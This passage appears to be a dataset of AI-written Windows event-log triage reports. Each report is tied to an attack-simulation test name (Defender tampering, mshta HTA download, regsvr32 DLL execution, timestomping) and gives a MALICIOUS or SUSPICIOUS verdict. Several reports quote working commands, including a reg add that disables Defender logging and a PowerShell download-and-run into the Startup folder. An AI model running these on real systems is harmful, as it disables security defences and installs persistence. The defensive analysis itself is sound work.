   - Quarantine and isolate the affected system (Server002) to prevent lateral movement or further compromise.
   - Retrieve and analyze the executable files copied and intended for service creation (`windows_service.exe`, `program.exe`).
   - Suspend the ""Example Service"" pending full analysis.

2. **Further Investigation**:
   - Conduct a thorough review of all processes initiated by `admin_test` and changes made under this account.
   - Examine network activity logs for anomalous connections or data transfer associated with this timeframe.
   - Review user access logs and permissions for irregularities or unauthorized accesses.

3. **Mitigation and Prevention**:
   - Strengthen monitoring of user activities involving account privileges and system-critical directory changes.
   - Apply stricter rules and alerting for process executions that match identified malicious patterns.
   - Educate users on recognizing unusual application behavior and reporting suspect activities. 

The detailed investigation of this incident should be escalated to the incident response team for comprehensive remediation and prevention strategies."
Kill Event Log Service Threads,"### Analysis

1. **Time Manipulation Activity (System Log & Security Log Events):**
   - There were multiple occurrences of time changes observed in the logs. The time was set back from `2024-10-28 11:06:55` to `2024-10-28 11:06:48`. This type of behavior might indicate an attempt to manipulate event logging or evade time-based security mechanisms. 
   - The process responsible for this change is `svchost.exe`, a legitimate Windows process. However, it can be tampered with or misused by attackers.

2. **Use of PowerShell (Sysmon Log & PowerShell Log Events):**
   - PowerShell was used with a sequence of commands that change the execution policy and download a script from an external source (`https://raw.githubusercontent.com/.../script.ps1`). This is highly concerning as it indicates a potential script being executed from the internet, a common tactic used by attackers to download and run malicious payloads.
   - The script is downloaded to a temporary location and then executed, which raises the suspicion of potentially malicious behavior.

3. **Privilege Escalation (Security Log Events):**
   - The user `admin_test` was granted several high-level privileges such as `SeDebugPrivilege`, `SeRestorePrivilege`, etc. While `admin_test` might have administrative rights, the assignment of these privileges in tandem with suspicious activities is a red flag.

4. **Process Execution (Sysmon Log Events):**
   - The execution of system utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` in quick succession can be indicative of system reconnaissance activities.
   - `wevtutil.exe` is specifically for managing event logs, which might be used to query or clear logs to hide tracks.

5. **Network-based Input (Security Log Events):**
   - The logon events involving NTLM authentication indicate a potential remote interaction, likely from `DESKTOP-3HL5B2P`, with an IP address in the IPv6 range `fe80::e3b5:5371:12a8:9c77`. If this workstation is unfamiliar or unauthorized, it might indicate lateral movement or an external threat actor.

### Assessment

Given the activities in the logs, particularly the PowerShell script download and execution, the time manipulation, elevated privileges, and potential indicators of reconnaissance, there appears to be malicious conduct present in the logs.

**Resolution: MALICIOUS**

### Guidance

1. **Immediate Incident Response:**
   - **Isolate the affected system** to prevent further spread or communication with potential external command and control servers.
   - **Conduct a thorough forensic analysis** on `Server002` to confirm the full extent of the compromise and identify any persistence mechanisms or additional payloads.

2. **Review and Block:** 
   - Assess the PowerShell execution policies and apply restrictive measures to prevent such script executions.
   - Block any external IPs or domains involved in the outgoing connections if identified as malicious during investigation.

3. **Audit Permissions:** 
   - Review recent privilege changes and only allow necessary access using the principle of least privilege.

4. **Coordinate with Security Teams:** 
   - Work with network and endpoint security teams to deploy further detection controls and monitoring for similar activity.

These steps should help contain the threat and mitigate future occurrences of similar attacks."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"Upon analyzing the provided logs, here is a detailed breakdown of the observations and findings:

### Suspicious Behavior Identified:

1. **PowerShell Usage:** 
   - There are multiple instances of PowerShell being executed with the command line containing `-nop -Command Write-Host CustomAction export executed me; exit`. The usage of `-nop` (no profile) is a common tactic to avoid detection and logging, potentially indicating obfuscation or malicious activity. 
   - PowerShell is used in conjunction with `msiexec.exe`, suggesting possible software installation or script execution, which warrants further investigation.

2. **Unusual Use of Msiexec:**
   - Msiexec is used to install a .msi file from a temporary user directory (`\AppData\Local\Temp\file\data.007\bin\data.007_DLL.msi`). Installation from temporary directories is unexpected and could indicate a malicious payload.
   - The logs show `msiexec.exe` being launched through `cmd.exe`, with `powershell.exe` running a command, suggesting a potential lateral movement or persistence mechanism.

### Indicators of Possible Compromise:

1. **Privilege Escalation and Unusual Account Activities:**
   - Multiple `EventID 4672` events indicate that a privileged account performed actions, commonly associated with administrative tasks. The associated privileges include potentially risky operations like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`.
   - The user `SERVER002\admin_test` is executing high-integrity processes, possibly indicating unauthorized privilege escalation.

2. **Abnormal Process Executions:**
   - The sequence of events shows processes like `conhost.exe` and `wevtutil.exe` executed in a pattern that aligns with command-line activity seen in attacks, specifically where `conhost.exe` wraps around other command-line utilities.

3. **Edge Update Anomalies:**
   - There are numerous logs indicating Microsoft Edge updates or related components executions. While these can be benign, the volume and timing, especially alongside other suspicious activities, merit verification that these are legitimate updates.

### Assessment and Resolution:

After considering the above observations, the overall situation could present elements consistent with a compromise or an attempted compromise depending on the context and additional corroborating evidence outside these logs. Specifically, the use of PowerShell with potentially obfuscated command lines and unusual software installation patterns flag the activity as a potential threat.

### Resolution: **SUSPICIOUS**

**Threats/Risks Identified:**
- Potential unauthorized software installation via `msiexec.exe`.
- Possible privilege escalation through execution of high integrity processes.
- Execution patterns and tools usage suggest playbooks typical of scripting attacks or lateral movement.

### Guidance on How to Proceed:

1. **Immediate Investigation:**
   - Verify the legitimacy of the scripts and installations (e.g., the MSI file). Check if they conform to any scheduled tasks or expected updates.
   - Analyze the origin and nature of files in the temporary folder (`data.007_DLL.msi`), checking for malware strains or unusual digital signatures.

2. **Monitor and Isolate:**
   - Increase monitoring on the host `Server002` for further anomalous activities.
   - Consider isolating the machine to prevent any potential lateral spread.

3. **Credential and Privilege Reviews:**
   - Review and, if necessary, limit network privileges of accounts involved, specifically `admin_test`.
   - Check for unauthorized account creations or modifications related to indicated SIDs in the security logs.

4. **Conduct Full Incident Response:**
   - Initiate a thorough incident response plan, including memory analysis and deep dive into any PowerShell scripts or commands executed.
   - Check for persistence mechanisms and thoroughly inspect scheduled tasks and startup programs.

These steps will help ensure that if the activities were indeed a part of a malicious attempt, they are contained and remediated appropriately."
Mshta Executes Remote HTML Application (HTA),"Based on the provided logs, let's analyze for potential indicators of malicious activity:

### Suspicious Activities Identified:

1. **PowerShell Activity:**
   - Multiple logs indicate PowerShell activity that involves the execution of a script with a sequence of suspicious commands:
     - `Invoke-WebRequest` to download a file from a GitHub repository, which is immediately a red flag, as this can be used to pull malicious code.
     - The downloaded content is saved to the Startup folder (`$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\data.005.hta`), which is often used to maintain persistence.
     - Execution of `mshta` to run the downloaded `.hta` file.
     - An attempt to stop the process `calculator`, which may indicate a distraction or evasion tactic.
   
   These activities suggest an attempt to execute a payload and maintain persistence on the host.

2. **Sysmon Logs:**
   - The logs indicate a process (`mshta.exe`) executing the file downloaded by PowerShell. This execution pattern is consistent with known attack methods where legitimate tools are abused to execute malicious scripts or files.
   - The execution hierarchy shows PowerShell as the parent process, aligning with the earlier observed script.

3. **Edge Update Service:**
   - Multiple entries related to Microsoft's EdgeUpdate service are shown. While numerous entries typically reflect normal update operations, the timing of these entries in proximity to the suspicious PowerShell activity can often be used as a cover-up, though there's no direct evidence of this here.

### Assessment:

The detected PowerShell script and its command structure strongly indicate potential malicious intent, especially considering the attempt to download and execute an .hta file from a web source. The use of legitimate tools such as PowerShell and mshta for such actions is a well-known tactic for bypassing traditional defenses by blending in with administrative tasks.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Quarantine the affected system to prevent any further spread of potential malware.
   - Block the GitHub URL from where the file was being downloaded to prevent further downloads.
   - Inspect and remove the `.hta` file from the Startup directory to eliminate persistence.

2. **Forensic Analysis:**
   - Conduct a full forensic analysis of the machine to ensure no other compromise vectors exist.
   - Look for additional artifacts or changes in the system that may indicate broader compromise.

3. **Security Measures:**
   - Assess and tighten endpoint detection capabilities, particularly around script execution monitoring.
   - Consider implementing strict PowerShell execution policies and network-level controls to block unauthorized downloads and execution attempts.

4. **User Awareness:**
   - Inform the appropriate personnel, particularly those like the CEO, about social engineering risks and the importance of vigilance around unsolicited scripts and executables. 

By taking these steps, you can mitigate the current threat and fortify against similar future threats."
Windows - Modify file last access timestamp with PowerShell,"Upon reviewing the provided Windows event logs, we can extract the following points of interest that may indicate suspicious or anomalous behavior:

### 1. Windows PowerShell Logs:
- **Anomalous PowerShell Command:**
  - There are multiple entries in the PowerShell logs indicating operations on a file path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt`.
  - The operation involves changing the `LastAccessTime` of the file to `01/01/1970 00:00:00` using PowerShell. This action is commonly referred to as “timestomping.”
  
#### Analysis:
  - **Timestomping**: This technique is used by attackers to modify file timestamps to evade detection, make forensic analysis more difficult, or to hide artifacts from incident responders.

### 2. Sysmon Logs:
- **PowerShell Usage by `admin_test`:**
  - Multiple Sysmon entries show the execution of `powershell.exe` by the user `SERVER002\admin_test`.
  - Such actions were observed for the same time period as the timestomping commands in the PowerShell logs.
  
- **Wevtutil Executions:**
  - Repeated invocation of `wevtutil.exe`, which is a command-line utility to manage Windows event logs, under the same user credentials.

- **Other Executions:**
  - The presence of commands like `whoami.exe` and `hostname.exe` suggests an attempt to gather information about the logged-in user and the hostname, which can be used as part of reconnaissance efforts.
  
#### Analysis:
  - The association of `wevtutil.exe` with the same time frame might suggest attempts to manipulate event logs, which is another tactic used by attackers to cover their tracks.

### 3. Application Log:
- **No direct suspicious activity detected** from the `Application` logs other than regular entries which might be part of normal operations or software licensing checks.

### 4. Security Log:
- **No security log entries provided**: Can't make any assessment due to lack of security log information.

### Conclusion:

Given the specific operations detected (timestomping, suspicious command executions like `wevtutil.exe`, and `whoami.exe`), the logs indicate behaviors typical with malicious activities aimed at evading detection and performing reconnaissance.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Investigation**: Conduct a deeper forensic analysis on the machine, `Server002`, particularly focusing on user activities, persistent malicious files, and potential backdoors.
- **File Integrity Monitoring**: Implement tools to monitor and alert on unusual timestamp changes.
- **Review Security Controls**: Ensure that endpoint detection and response (EDR) systems are appropriately configured to detect such evasive techniques.
- **User Behavior Monitoring**: Add monitoring alerts for unusual out-of-hours activities by administrative accounts.
- **Log Management**: Consider forwarding logs to a central repository immediately to prevent local log tampering."
Disable Windows Error Reporting Settings,"After analyzing the provided Windows event logs, I have identified several key points and possible concerns:

1. **Time Change Events**: The security logs contain events with EventID 4616 indicating a system time change. While this could be routine, unauthorized time changes can also be an attempt to manipulate log timelines for malicious purposes. The changes were initiated by the `LOCAL SERVICE` account via `svchost.exe`, which is common, but should be monitored for unusual patterns or frequency.

2. **Logon Events**: Several logon events (EventID 4624) occurred for the user `admin_test` with LogonType 3, which indicates a network logon. This is standard for accessing network resources but significant since the account is named `admin_test`. This account also had a privileged logon session as indicated by EventID 4672, which granted numerous high-level privileges, including SeDebugPrivilege. The presence of these privileges is alarming and often linked to administrative tasks or potentially malicious activities requiring deep system access.

3. **Usage of Administrative Tools**: The Sysmon logs indicate the execution of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`, typically used for querying events, managing command windows, and identifying user information, respectively. While these could be part of standard administrative tasks, their execution together, particularly near time change events, deserves additional scrutiny.

4. **Registry Modification**: The `cmd.exe` execution involves the use of `reg.exe` to modify Windows Defender settings, specifically aiming to disable enhanced notifications. Such changes without authorization could be indicative of attempts to reduce system alerts regarding malicious activities.

### Summary and Assessment

- The security event logs reflect actions that may or may not indicate malicious activity, depending heavily on context. The privileged logon and registry changes, especially to security settings (i.e., Windows Defender), elevate these actions to a concerning level.
- Regular use of `admin_test` with high privileges needs to be accounted for: whether this activity is expected of such an account, and if not, why such privileges are granted or used in this manner.
- The repeated use of administrative command-line tools in a short span suggests potential automation scripts or a sequence indicative of malicious activity.

### Resolution: SUSPICIOUS

Based on the above points, the actions recorded in the logs are suspicious. They demonstrate behavior that is anomalous without clear justification from legitimate user activity such as:

- The seemingly unnecessary disabling of security notifications.
- High-privilege activities conducted using scripts or command prompts.

### Recommendations

- Conduct a deeper investigation into the purpose and source of the `admin_test` logon sessions. Verify if the activity aligns with expected administrator tasks.
- Audit the system for unsanctioned script or tool deployment, especially around times of privilege escalation or security changes.
- Tighten monitoring around key systems, particularly those involving changes to system time, privilege escalation, and security settings modifications.
- Consider isolating the CEO's machine for a thorough security review to ensure no threats persist and correct any potentially malicious changes to system configurations."
Disable Powershell ETW Provider - Windows,"Based on the analysis of the provided logs, several key observations and potential issues have emerged. Here's a detailed breakdown:

1. **PowerShell Execution:**
   - The logs show the execution of a PowerShell script with an unusual command line invoking `pstools\script.exe` with the `-accepteula -i -s` flags, which is indicative of `PsExec` being used to run processes with elevated privileges. This script is executed from a temporary directory, which is uncommon and possibly indicates malicious behavior.
   - The use of `logman update trace ""EventLog-Application"" --p ""Microsoft-Windows-Powershell"" -ets` suggests that the attack script is attempting to modify or add logging related to PowerShell operations, potentially to cover tracks or monitor PowerShell activity.

2. **Sysmon Log Entries:**
   - Multiple entries in the Sysmon logs reveal activities involving `pstools\script.exe` and `PSEXESVC.exe`, which are also related to the `PsExec` utility from Sysinternals. The presence of `PSEXESVC.exe` (a PsExec service) is particularly concerning as it allows the execution of commands remotely.
   - The `PsExec` tool, when found in logs, is often an indicator of a potential compromise or unauthorized access, as it is frequently used by attackers to move laterally across networks.
   - The logs show tasks being run with system-level privileges, which typically raises a red flag about potential privilege escalation.

3. **Windows Event Logs:**
   - The system log records show the creation of a service `PSEXESVC` using `PsExec`, which is suspicious and aligns with potential unauthorized remote script or command execution.
   - The application log reflects normal service operations like `edgeupdate` service activity, showing no clear signs of issues on its own.

**Assessment:**

The combination of scripting through PowerShell, the usage of `PsExec` to execute commands and modify trace logging with system-level privileges indicates potentially malicious activity. These behaviors align with typical tactics used for lateral movement and persistence within a compromised environment.

**Resolution: MALICIOUS**

Given the evidence and typical usage of these tools and tactics in an unauthorized and stealthy manner, the resolution of this investigation is that the activity is indeed malicious.

**Guidance for Proceeding:**

1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further propagation of potential malware or attacker access.
   - Conduct a comprehensive security scan and forensics analysis on the isolated system to determine the scope of the compromise and identify any additional malicious artifacts.
   - Review other systems in the network for similar signs of compromise.

2. **Security Monitoring and Response Enhancement:**
   - Increase monitoring on PowerShell usage and PsExec activities across all systems.
   - Implement advanced threat detection rules that flag unusual PowerShell scripts and PsExec invocations.

3. **Patch and Hardening:**
   - Ensure all software, particularly security software, is updated to the latest versions to protect against known vulnerabilities.
   - Strengthen security configurations to restrict unauthorized use of administrative tools like PsExec and PowerShell.

By taking these measures, the organization's security posture will be improved, reducing the risk of future similar incidents."
Regsvr32 local DLL execution,"After a thorough analysis of the provided logs for the Windows host, specifically focusing on the Application and Sysmon logs, here are the findings:

### Analysis:

1. **PowerShell Execution**:
   - There is an execution of `powershell.exe` by the user `SERVER002\admin_test`. This alone is not suspicious, but the events surrounding it must be analyzed to determine the context.

2. **Use of `wevtutil.exe`**:
   - There are repeated instances of `wevtutil.exe` being executed, which is a command-line tool for accessing Windows Event Logs. The presence of this tool being used by an `admin_test` account is somewhat unusual but not necessarily malicious unless combined with other suspicious activity.

3. **Command Line Execution via `cmd.exe`**:
   - There is a notable command execution using `cmd.exe` intended to register a DLL, `AllTheThingsx86.dll`, using `regsvr32.exe`. This process is executed conditionally based on the processor architecture (AMD64 in this case). This kind of DLL registration from a temporary user directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\`) is suspicious and could indicate a potential compromise attempt, as regsvr32 is commonly used in living-off-the-land binaries (LoLBins) attacks.
   - `AllTheThingsx86.dll` might not be a standard DLL, and its registration under high integrity processes underscores the suspicion.

4. **Frequent Edge Update Installations**:
   - There are multiple events related to the execution of Microsoft Edge Update processes. The presence of these processes, particularly from temporary directories (e.g., `C:\\Program Files (x86)\\Microsoft\\Temp\\EUA54E.tmp\\`), may suggest attempts to run unauthorized updates or installations, which could also be an attempt to leverage trusted executable paths for malicious activity.

### Assessment:

- The combination of processes interacting with the event log (`wevtutil.exe`), PowerShell and command line executions aimed at registering a DLL from a temporary directory, and the multiple Edge update activities does not align with regular operational activities.
- The use of `regsvr32.exe` to register a DLL in a potentially unauthorized manner is particularly concerning and indicative of potentially malicious conduct, often seen in technique T1218.011 of the MITRE ATT&CK framework (regsvr32 executing code). 

### Resolution:

**SUSPICIOUS**: 
- The actions described, particularly the DLL registration from a user temp directory involving `cmd.exe` and `regsvr32.exe`, require further investigation to confirm whether they are part of a legitimate process or represent unauthorized and potentially malicious activity.
- It's critical to verify the legitimacy of the `AllTheThingsx86.dll`, investigate the related security posture of the system, and potentially initiate a proactive malware scan, especially focused on DLL registration and usage patterns.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the affected system to prevent potential further compromise.
   - Capture and analyze memory to determine any active malicious payloads or indicators of compromise (IoCs).
   
2. **Follow-Up Investigations**:
   - Investigate the source, integrity, and purpose of `AllTheThingsx86.dll`.
   - Review EDR and additional security logs surrounding `**regsvr32.exe`** and `Edge Update` executions for anomalies.
   
3. **Preventive Measures**:
   - Strengthen monitoring on DLL registrations, particularly from user-accessible directories.
   - Consider employing stricter AppLocker or similar policies to control execution of potentially harmful Windows binaries.

These steps will help clarify whether these activities are indeed part of a coordinated attack or unauthorized configuration attempts, and assist in developing a response to protect the CEO’s machine and the corporate network infrastructure."
SIP (Subject Interface Package) Hijacking via Custom DLL,"### Analysis:

Upon reviewing the Windows event logs, several indications of potentially suspicious activities were observed:

1. **PowerShell Execution:**
   - Multiple instances of PowerShell execution with commands that involve reading content from system files and matching specific patterns. Specifically:
     - `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;`
   - The usage of `Get-Content` to read `.inf` files and the use of regular expressions within the scripts indicates someone may be searching for specific configurations or vulnerabilities.

2. **Regsvr32 Usage:**
   - An instance where `cmd.exe` was executed to run `regsvr32.exe` which is a known technique for executing code via DLLs, potentially indicative of malware or an attack:
     - `CommandLine=""\""cmd.exe\"" /c regsvr32.exe C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\GTSIPProvider.dll""`

3. **Unusual User Activities:**
   - There are indications of activities conducted under the `admin_test` user account. This user initiated PowerShell commands and operated the console host. It is crucial to validate if these actions are authorized.
   - Use of Windows services with potential impersonation privileges (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, etc.). These privileges are sensitive and could be abused if not intended for a legitimate task.

4. **Frequent Windows Security Logins:**
   - Multiple entries showing `EventID 4624` which represents successful logons, using various service accounts.
   - Logon type 3 indicates network logons, which are typically seen with access to shared resources.

5. **Sysmon and System Logs:**
   - Routine Windows Update activities are observed; however, frequent updates or changes accompanied by the execution of system-related processes without an official timetable could deserve a thorough examination.

### Assessment:
The observed activities, especially the uses of PowerShell with script execution policy as restricted and the registration of potentially questionable DLL files using `regsvr32.exe`, indicate unusual behavior that could potentially be signs of compromise or malicious activity. Additionally, the services indicating impersonation privileges and frequent logins need further inspection to ensure they're expected and not part of lateral movement attempts.

### Resolution: **SUSPICIOUS**

Given the evidence from the logs, the activities could potentially indicate an ongoing threat, but more information and investigation are needed to confirm malicious intent. It is advisable to:

1. **Validate User Activity:**
   - Confirm whether the `admin_test` user should be executing these scripts and commands.
   - Check for any insider threat indicators.

2. **Review Execution Context:**
   - Investigate context around DLL registrations and PowerShell scripts to discern if these were part of legitimate administrative routines or exploratory actions indicative of an attack.

3. **Enhance Monitoring:**
   - Set up alerts for further use of PowerShell, especially with an execution policy set to `Restricted`, and any other instances of `regsvr32.exe`.

4. **Conduct Threat Hunting:**
   - Examine the environment for any additional indicators of compromise such as other suspicious binaries or potential lateral movement.

By investigating these suspicions, the organization can better assess the risks and take appropriate mitigation steps if necessary."
Modify RDP-Tcp Initial Program Registry Entry,"Upon analyzing the provided logs, several points of interest were noted, with particular attention on the suspicious activities that may indicate potential malicious behavior:

### Summary of Analysis:

**System Log:**
- Events related to time changes were recorded frequently, including updates from `time.windows.com`. While time changes could be benign, unauthorized or unexpected time changes may suggest tampering to manipulate log timestamps.

**Application Log:**
- Primarily involves the stopping of the EdgeUpdate service twice. This may be considered benign unless it is disruptive or unexpected.

**Security Log:**
- Multiple security audit logs were present indicating a logon session by `admin_test` with elevated privileges. Event ID 4672 (Special privileges assigned) is noteworthy, as it could be part of normal administrative duties or an indication of privilege escalation if unexpected.
  
**Sysmon Log:**
- There is evidence of command-line utility usage such as `cmd.exe`, `reg.exe`, `wevtutil.exe`, and registry modifications pertaining to `RDP`. The use of `reg.exe` to modify the registry, particularly concerning RDP settings, could indicate a potential attempt to persist or establish RDP settings, which may be associated with lateral movement or persistence techniques.
- Notable is the command involving enabling and setting an initial application on RDP sessions to Notepad, which is highly abnormal for legitimate administrative setup.
- The presence of multiple instances of `conhost.exe` associated with `wevtutil.exe` and other command-line executions suggests potential attempts to manipulate or view Windows event logs.
  
**Edge Update:**
- A significant amount of Edge Update processes under system user `NT AUTHORITY\SYSTEM` executing, which appears normal for update processes. However, such processes can be hijacked in certain attack scenarios.

### Detailed Findings and Recommendations:

1. **Time Change Events:**
   - Investigate the rationale and necessity behind frequent time changes, especially associated with logs as manipulation can hinder log integrity verification.
   - Verify if there was authorized maintenance or reason provided for these changes.

2. **Security and Special Privileges:**
   - Confirm why `admin_test` was assigned multiple special privileges at that time. It may indicate regular activity if the timing matches scheduled administrative tasks or raises red flags if these privileges were unnecessary.
  
3. **Command Line and Registry:**
   - Review the necessity and origin of `cmd.exe` and `reg.exe` commands, particularly changes in the `RDP` registry keys. This activity is suspicious and could be associated with compromising remote access.
   - Verify if these were planned configuration changes and cross-verify with system maintenance timelines.

4. **Wevtutil and Conhost Activity:**
   - The context of this activity surrounding log management could indicate log tampering or reconnaissance activities.

5. **Processes Running Under System Account:**
   - While updates to Edge are typical, checking associated telemetry or submission can ensure they haven’t been tampered with for executing unauthorized commands.

### Resolution:

**SUSPICIOUS** - The logs reveal multiple activities like unauthorized registry changes, potential privilege escalation, and heavy command line activity that warrant further investigation. 

**Next Steps:**
- Cross-reference the admin activities and registry changes with planned IT or administrative activities.
- Conduct an integrity check and audit of user accounts, specifically `admin_test`, to ensure credentials have not been compromised.
- Review network access logs for any unusual RDP connections or associated alerts.
- Run a comprehensive malware and integrity scan on the reported systems to ensure no unauthorized modifications or persistence mechanisms are present."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"Upon reviewing the provided Windows event logs, I have made the following observations:

1. **Multiple `wevtutil.exe` and `conhost.exe` Executions:**
   - There are multiple executions of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` under the user ""SERVER002\admin_test."" 
   - `wevtutil.exe` is used to manage event logs and event log files, which can be benign but also used by attackers to cover tracks.
   - `conhost.exe` is generally considered legitimate, as it is used to facilitate the conhost process. Frequent launches, however, might suggest something interacting with a console window.

2. **Execution of `HOSTNAME.EXE` and `whoami.exe`:**
   - `HOSTNAME.EXE` and `whoami.exe` were run, seemingly to gather system and user information. This behavior can be part of typical administrative tasks but is also common in reconnaissance stages of compromises.

3. **Suspicious `cmd.exe` and `reg.exe` Execution:**
   - A critical observation is the execution of `cmd.exe` to modify the registry. The command used is: 
     ```
     ""cmd.exe"" /c reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f
     ```
   - This command attempts to disable Windows Defender logs, which is highly suspicious and potentially malicious as it may be used to prevent security logging.

4. **Use of High Integrity Level:**
   - The logs show processes are running with High Integrity Level, indicating they have a substantial level of permissions, which increases the risk if these processes are indeed malicious in nature.

5. **MicrosoftEdgeUpdate:**
   - The execution of `MicrosoftEdgeUpdate.exe` appears to be a standard operation for maintaining Microsoft Edge, conducted by the SYSTEM user context, which is typical behavior for system update processes.

### Assessment:

- The execution of multiple utility and system information gathering tools like `hostname`, `whoami`, and `wevtutil` in conjunction with logs indicating attempts to disable Windows Defender logging suggest potentially malicious behavior aimed at reconnaissance and anti-forensics.

### Resolution:

- **MALICIOUS**: The identified behavior, specifically the registry modification to disable Windows Defender events, strongly indicates malicious intent.

### Guidance:

1. **Immediate Action:**
   - Ensure the integrity of the CEO's machine. Isolate the system from the network to prevent further actions that might be harmful.
   - Conduct a full malware scan and analysis on the system utilizing updated antivirus tools.

2. **Further Investigation:**
   - Investigate the origins of the `admin_test` user actions. Check for any unauthorized access or anomalies relating to user accounts.
   - Review related network traffic, particularly around the time these processes were executed, for unusual communications.
   - Validate any changes made by `reg.exe` to ensure no other parts of the system's security configurations have been tampered with.

3. **Recovery:**
   - Restore any disabled security logging features.
   - Review and enhance security monitoring and incident response procedures to improve detection and analysis capabilities."
Add domain to Trusted sites Zone,"Upon reviewing the provided event logs, the key findings and assessments are as follows:

1. **Windows PowerShell Log Analysis:**
   - The PowerShell logs indicate a script execution that modifies Internet Explorer's (IE) Zone Map settings. The script specifically targets a domain ""bad-domain.com"" and modifies settings for ""bad-subdomain"". The modifications set the HTTPS, HTTP, and wildcard entries to a DWORD value of 2 which typically corresponds to a Trusted Sites zone setting in IE.
   - The action of scripting such modifications to Zone Map settings, especially to a domain named ""bad-domain.com"", is unusual and raises a red flag for potential malicious activity. This could be an attempt to lower security settings for that domain, allowing for potentially malicious activities without user intervention or security warnings.
   - The use of a scripted approach through PowerShell for this purpose strongly indicates a level of automation consistent with malicious intent.

2. **Sysmon Log Analysis:**
   - The logs show frequent appearance of Microsoft Edge Update processes executing with NT AUTHORITY\SYSTEM. While these processes are legitimate, the timing, frequency, and particular command-line arguments (e.g., `/regsvc`, `/regserver`, `/svc`, `/c`, `/ua`, `/ping`) could be consistent with normal software updates or maintenance.
   - However, these entries by themselves, considering the context of the whole logs, don't necessarily indicate malicious activity without correlating unusual command-line usage.

3. **Activity by User SERVER002\admin_test:**
   - Multiple `wevtutil` and `conhost` processes associated with the user ""SERVER002\admin_test"" appear across the logs, which could be related to log management or monitoring activities. However, without specific malicious actions or arguments, these logs alone are not inherently suspicious.

**Assessment and Recommendation:**
- The PowerShell script detected is the most suspicious element within these logs. The action of altering security zones in the registry for a seemingly suspicious domain is indicative of potentially malicious intent, often seen in scenarios where attackers try to bypass security warnings or execute further payloads under less restrictive settings.
  
**Resolution:**
- **MALICIOUS**: The modification of Zone Map settings via the script indicates a potential compromise or an attempt to create a backdoor. Immediate actions should include:
  - Isolating the machine to prevent further potential data exfiltration or lateral movement.
  - Conducting a thorough investigation on the specific PowerShell script source and any additional scripts/artifacts.
  - Reviewing network traffic for connections to ""bad-domain.com"".
  - Scanning the system for additional signs of compromise or malware.
  - Advising user awareness of phishing attempts that could have led to this compromise."
Tamper with Windows Defender ATP using Aliases - PowerShell,"After reviewing the provided log entries, several patterns and activities stand out:

### Suspicious Behavior Identified

1. **Time Change Events:**
   - There are multiple events indicating the system time was changed. While sometimes legitimate, time changes by `svchost.exe` can be indicators of tampering, especially if unexplained or frequent.

2. **Windows Defender Configurations:**
   - The command to change Windows Defender preferences using PowerShell (`Set-MpPreference`) multiple times as seen is highly suspect. The command modifies settings such as `DisableRealtimeMonitoring` (`drtm`), `DisableBehaviorMonitoring` (`dbm`), `DisableScriptScanning` (`dscrptsc`), and `DisableArchiveScanning` (`dbaf`). These actions are often used to disable or bypass security protections.

3. **Extended Privileges:**
   - There is a log-on event (ID: 4624) for `admin_test` that is followed by a privilege escalation (ID: 4672) granting significant privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This could indicate an attempt at privilege escalation, potentially unauthorized.

4. **Frequent Process Executions:**
   - A significant number of process executions involving `wevtutil.exe` and `conhost.exe` tied to user `admin_test`. The heavy use of these utilities could suggest log manipulation or command-line interfacing or scripting.

5. **Windows Defender State:**
   - The application log shows Windows Defender being placed into a `SECURITY_PRODUCT_STATE_SNOOZED` state multiple times. This could be related to the observed PowerShell activity to disable Windows Defender features, suggesting an attempt to reduce system defenses.

6. **Microsoft Edge Update Activity:**
   - Numerous processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are observed. While updates can be legitimate, if any fraudulent processes attempted to masquerade as updates, it could provide a vector for attack. More detailed examination of this activity could be necessary.

### Assessment
Considering the observed activities, especially the disabling of security settings, apparent privilege escalation, and frequent command-line utility usage, there are indicators of potential malicious activity.

1. **SUSPICIOUS:**
   - The logs show activities that are irregular and potentially harmful, such as disabling Defender settings and unexplained time changes. These behaviors need further investigation to determine if they were authorized or part of a malicious plot.
   
### Threats and Risks Identified
- **Potential for Malicious Software:** The PowerShell commands indicate attempts to reduce security, leaving the system vulnerable to threats.
- **Insider Threat Potential:** The `admin_test` account engages in extensive elevated privilege activities, suggesting either misuse or compromise of a privileged account.

### Recommendations for Proceeding
- **Verify all Privileged Activities:** Investigate whether these observed activities were sanctioned or if the account was compromised.
- **Audit Recent Changes:** Check for recent administrative changes, particularly those affecting security settings and installations.
- **Conduct a Threat Hunt:** Engage in further scanning and monitoring to detect potential malicious code that may have bypassed defenses.
- **Enhance Monitoring:** Increase the granularity of logging and monitoring, focusing on common attack vectors such as PowerShell and svchost.exe.

Given the unusual and potentially harmful activities identified, the next best step would be a detailed forensic investigation to confirm the context and intention of these actions. The aim should be to determine if these actions were deliberate or malicious.

**Resolution: SUSPICIOUS**"
Modify registry to store logon credentials,"Upon examining the provided Windows event logs, several points of interest stand out that require further analysis:

1. **Time Manipulation**: The Security and System logs contain events indicating time changes on the system (Event ID 4616). This could indicate an attempt to manipulate timestamps, which is often associated with hiding malicious activities. However, these time changes are small and might be a result of system synchronization with a time source.

